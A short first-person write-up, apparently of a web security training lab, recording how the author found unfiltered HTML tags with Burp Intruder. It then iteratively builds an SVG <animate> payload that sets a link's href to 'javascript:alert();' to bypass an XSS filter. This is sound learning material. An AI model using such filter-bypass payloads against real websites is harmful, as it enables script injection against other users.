Through Burp Intruder, I found that the following tags are not blocked:

* `<a>`
* `<animate>`
* `<image>`
* `<svg>`
* `<title>`

So I guess I need to find an attribute that allows code execution when an image is clicked or something like that,  
but first I need to learn exactly what each tag means and does.

So I think I can set the `href` attribute of `<a>` using `<animate>`, maybe something like:

```html
<a>
    <animate attributeName="href" values="javascript:alert();" />
    Click me
</a>
```

But the text "Click me" doesn't show up, so I put it in `<p>` and then it did show:

```html
<a>
    <animate attributeName="href" values="javascript:alert();" />
    <p>Click me</p>
</a>
```

But it's not clickable, which means something about the `<animate>` tag is wrong.  
So I looked into it, and it looks like I'm missing `<svg>` tag:

```html
<svg>
    <a>
        <animate attributeName="href" values="javascript:alert();" />
        <p>Click me</p>
    </a>
</svg>
```

But then the `<p>` tag turned red (in vscode), so I guess I can't use that inside `<svg>`. I looked for other text tags by Googling the following:

> text inside svg

and finally ended up with `<text>`:

```html
<svg>
    <a>
        <animate attributeName="href" values="javascript:alert();" />
        <text>Click me</text>
    </a>
</svg>
```

This solved the lab, but the text is very small. So for my own knowledge I looked a bit more into `<text>`,  
and my final answer is:

```html
<svg>
    <a>
        <animate attributeName="href" values="javascript:alert();" />
        <text x=50 y=50>Click me</text>
    </a>
</svg>
```
